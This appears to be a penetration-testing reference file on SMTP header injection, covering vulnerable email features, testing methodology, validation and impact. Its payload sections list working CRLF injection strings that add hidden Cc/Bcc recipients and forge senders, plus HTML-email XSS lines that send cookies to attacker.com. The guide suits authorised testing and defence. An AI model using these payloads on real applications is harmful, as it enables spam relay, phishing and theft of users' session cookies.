---
name: smtp-injection
description: SMTP header injection and email-based attacks — CC/BCC injection, email spoofing, and spam relay abuse
---

# SMTP Injection

SMTP injection occurs when user-supplied input is incorporated into email headers or commands without sanitization. Attackers can inject additional recipients (CC/BCC), forge sender addresses, add custom headers, or turn the application into an open spam relay.

## Attack Surface

**Vulnerable Features**
- Contact forms / "Send message to owner" features
- Password reset emails with user-controlled fields
- Email notification subscriptions
- Invoice/receipt emails with user data
- Forwarding features ("Share this page")
- "Invite a friend" / referral systems
- Support ticket email notifications
- "Email yourself" export features

**User-Controlled Fields in Emails**
- To address
- Subject line
- From/Reply-To (user's email input)
- Email body (message content)
- CC/BCC fields

## Injection Characters

```
\n   = LF  (0x0A)  → new SMTP header
\r   = CR  (0x0D)  → part of CRLF
\r\n = CRLF        → new SMTP header (most reliable)
%0a  = URL-encoded LF
%0d  = URL-encoded CR
%0d%0a = URL-encoded CRLF
```

## Payloads

### CC/BCC Injection (Spam Relay)

```
# In email/name field:
victim@victim.com%0ACc:attacker@evil.com
victim@victim.com%0D%0ACc:attacker@evil.com
victim@victim.com%0ABcc:attacker@evil.com%0ABcc:attacker2@evil.com

# In subject field:
Important Update%0ACc:target@evil.com
Reset Password%0D%0ABcc:attacker@evil.com

# In name field:
John Doe%0ATo:spamtarget@evil.com%0ASubject:Spam
```

### To Field Injection

```
# Multiple recipients via comma (often allowed by mail function):
victim@victim.com,attacker@evil.com

# SMTP verb injection:
victim@victim.com\nDATA\nFrom: forged@bank.com\nSubject: Urgent\n\nSpam content\n.

# Injection with CC:
victim@victim.com\nCC: attacker@attacker.com
```

### Subject Header Injection

```
# Add custom headers:
Reset Password\r\nBCC:attacker@evil.com

# Override MIME type:
Invoice\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>

# Add X-header for phishing:
Your order\r\nX-Spam-Status: No\r\nX-Priority: 1\r\nFrom: noreply@bank.com
```

### Body Injection (XSS in HTML Email)

```html
<!-- If email body is HTML and sanitization is insufficient: -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror=fetch('http://attacker.com/?c='+encodeURIComponent(document.cookie))>
<a href="http://attacker.com">Click here to verify</a>
```

### Open Relay Test

```bash
# Test if app will relay email to arbitrary addresses
# Contact form → send to any email:
To: external-victim@any-domain.com  ← not the site owner
Subject: Test
Message: Testing relay

# If email delivered → open relay
# Can be abused for spam campaigns using app's reputation
```

## Email Spoofing

### SPF Bypass

```
# If app sends email from user-controlled From: address:
From: admin@target.com  ← forged sender

# SPF only checks envelope sender (MAIL FROM), not header From:
# DMARC alignment requires both to match
# Test: can you set From: to target.com's domain?
```

### Reply-To Manipulation

```
# Set Reply-To to attacker's address:
# Victim replies → reply goes to attacker, not original sender
Reply-To: attacker@evil.com%0D%0AFrom:noreply@target.com
```

## Testing Methodology

1. **Find email-sending features** — Password reset, contact, invite, notification settings
2. **Inject CRLF in all fields** — Name, email, subject, message → check for CC/BCC delivery
3. **Test comma-separated To** — `victim@x.com,attacker@x.com` in email field
4. **Test body injection** — HTML/XSS in message field
5. **Test From/Reply-To control** — Can you set arbitrary sender?
6. **Test open relay** — Send to non-target email addresses via contact form

## Validation

1. Demonstrate that an injected CC/BCC recipient received the email
2. Show the raw email headers proving the injection
3. For spam relay: show email delivered to an address not intended by the application
4. For XSS in email: show the rendered HTML in email client

## False Positives

- Input sanitized (CRLF stripped before use in headers)
- Using SMTP library that validates header values
- Injection reflected in body (not headers) — still test for HTML injection
- Email queued but not delivered (test with patient waiting)

## Impact

- Spam relay using trusted application domain → domain reputation damage
- CC/BCC injection → email interception, privacy violation
- Phishing via forged sender → credential theft
- XSS in HTML email → cookie/token theft when victim opens email

## Pro Tips

1. CRLF injection in email fields is often overlooked in standard web security testing
2. Comma-separated emails in the `To` field are often accepted directly by `mail()` functions
3. Use your own email address as both victim and attacker for safe testing
4. `php mail()` is particularly vulnerable to CRLF injection in the `$to`, `$subject`, and `$headers` parameters
5. Test in staging/dev environments to avoid spamming real users
6. Combine with domain spoofing analysis — if From header is injectable + no DMARC, phishing risk is critical
7. HTML injection in email (without JS execution) is still reportable as phishing vector

## Summary

SMTP injection enables spam relay, header forgery, and email interception by inserting CRLF sequences into email-sending functions. Test every user-controlled field that gets incorporated into emails. Comma-separated recipients and CRLF header injection are the most commonly found variants in modern web applications.
